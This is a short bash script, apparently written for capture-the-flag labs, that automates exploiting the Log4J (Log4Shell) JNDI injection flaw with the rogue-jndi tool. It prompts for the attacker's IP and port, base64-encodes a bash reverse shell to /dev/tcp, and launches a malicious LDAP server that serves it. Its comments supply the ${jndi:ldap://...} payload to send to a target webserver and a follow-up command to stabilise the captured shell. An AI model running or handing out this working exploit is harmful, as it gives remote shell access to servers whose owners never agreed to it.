#!/bin/bash
#This is for Log4J exploitation using rogue-jndi
#Send ${jndi:ldap://10.10.14.11:1389/o=tomcat} (replace the ip with your ip) to the webserver once this is up and running, you may need to change the /o=tomcat with one of the following depending on the server
#/
#/o=reference
#/o=websphere2
#/o=websphere2
#/o=tomcat
#/o=websphere1
#/o=websphere1,wsdl=*
#/o=groovy

echo "my ip:"
read my_ip
echo "my port:"
read my_port
reverse_shell=`echo 'bash -c bash -i >&/dev/tcp/'$my_ip'/'$my_port' 0>&1' |base64`
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,$reverse_shell}|{base64,-d}|{bash,-i}" --hostname $my_ip
echo ""
echo ""
echo ""
echo "Once this is complete and you've got a reverse shell, remember to use the following command within nc -lvnp (port)"
echo "script /dev/null -c bash"
echo "This will help to make the shell more useable"